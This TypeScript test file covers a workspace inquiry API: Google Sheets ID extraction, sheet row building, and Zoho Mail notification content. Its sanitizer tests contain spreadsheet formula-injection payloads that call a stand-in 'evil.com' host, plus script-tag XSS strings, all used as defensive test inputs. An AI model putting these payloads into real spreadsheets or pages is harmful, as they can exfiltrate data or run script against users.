import test from 'node:test';
import assert from 'node:assert/strict';
import {
  extractSpreadsheetId,
  sanitizeSheetCell,
  buildSheetRowValues,
  buildZohoEmailContent,
  INQUIRY_SHEET_HEADERS,
  WorkspaceInquiryPayload,
} from './workspaceApi';

test('extractSpreadsheetId extracts valid ID from Google Sheets URLs and raw IDs', () => {
  const fullUrl =
    'https://docs.google.com/spreadsheets/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/edit#gid=0';
  assert.equal(
    extractSpreadsheetId(fullUrl),
    '1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms'
  );

  const rawId = '1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms';
  assert.equal(extractSpreadsheetId(rawId), rawId);

  assert.equal(extractSpreadsheetId(''), null);
  assert.equal(extractSpreadsheetId(null), null);
  assert.equal(extractSpreadsheetId('short'), null);
  assert.equal(extractSpreadsheetId('https://example.com/not-a-sheet'), null);
});

test('sanitizeSheetCell neutralizes Spreadsheet Formula Injection and XSS tags', () => {
  assert.equal(
    sanitizeSheetCell('=IMPORTXML("http://evil.com", "//a")'),
    '\'=IMPORTXML("http://evil.com", "//a")'
  );
  assert.equal(sanitizeSheetCell('+SUM(A1:A10)'), "'+SUM(A1:A10)");
  assert.equal(sanitizeSheetCell('@HYPERLINK("http://evil.com")'), "'@HYPERLINK(\"http://evil.com\")");
  assert.equal(
    sanitizeSheetCell('<script>alert(1)</script>Enterprise Cloud'),
    'Enterprise Cloud'
  );
});

test('buildSheetRowValues produces 12 columns aligned with INQUIRY_SHEET_HEADERS', () => {
  const samplePayload: WorkspaceInquiryPayload = {
    fullName: 'Alex Vance',
    email: 'alex@company.com',
    companyName: 'Vance Dynamics',
    phone: '+1 555-019-2834',
    projectDescription: 'Building a multi-region cloud platform and mobile application.',
    selectedServices: ['Custom Software Development', 'Cloud and DevOps'],
    complexity: 'growth',
    platforms: ['web', 'cloud'],
    estimatedWeeksMin: 8,
    estimatedWeeksMax: 11,
    estimatedCostRange: '$54k - $90k',
    recommendedTeamSummary: '4 Specialists (Tech Lead ×1, Senior Eng ×2, QA ×1)',
    submittedAtIso: '2026-10-25T16:00:00.000Z',
  };

  const row = buildSheetRowValues(samplePayload);
  assert.equal(row.length, INQUIRY_SHEET_HEADERS.length);
  assert.equal(row[0], '2026-10-25T16:00:00.000Z');
  assert.equal(row[1], 'Alex Vance');
  assert.equal(row[2], 'alex@company.com');
  assert.equal(row[3], 'Vance Dynamics');
  assert.equal(row[8], '8-11 Weeks');
});

test('buildZohoEmailContent constructs sanitized plain-text and HTML email notifications for Zoho Mail', () => {
  const samplePayload: WorkspaceInquiryPayload = {
    fullName: 'Elena Rostova',
    email: 'elena@rostova.io',
    companyName: 'Rostova AI <script>alert(1)</script>',
    phone: '+44 20 7946 0991',
    projectDescription: 'Need AI pipeline & data analytics integration.',
    selectedServices: ['AI and Machine Learning', 'Data and Analytics'],
    complexity: 'enterprise',
    platforms: ['web', 'cloud'],
    estimatedWeeksMin: 12,
    estimatedWeeksMax: 16,
    estimatedCostRange: '$120k - $180k',
    recommendedTeamSummary: '6 Specialists',
    submittedAtIso: '2026-10-25T16:00:00.000Z',
  };

  const zohoContent = buildZohoEmailContent('us620009@gmail.com', samplePayload);

  assert.equal(zohoContent.recipientEmail, 'us620009@gmail.com');
  assert.equal(zohoContent.replyTo, 'elena@rostova.io');
  assert.equal(zohoContent.subject, '[Trever Project Inquiry] Elena Rostova (Rostova AI)');
  assert.equal(zohoContent.textBody.includes('ZOHO MAIL NOTIFICATION'), true);
  assert.equal(zohoContent.textBody.includes('$120k - $180k'), true);
  assert.equal(zohoContent.htmlBody.includes('<script>'), false);
  assert.equal(zohoContent.htmlBody.includes('Need AI pipeline &amp; data analytics integration.'), true);
  assert.equal(zohoContent.mailtoUrl.startsWith('mailto:us620009%40gmail.com?subject='), true);
});
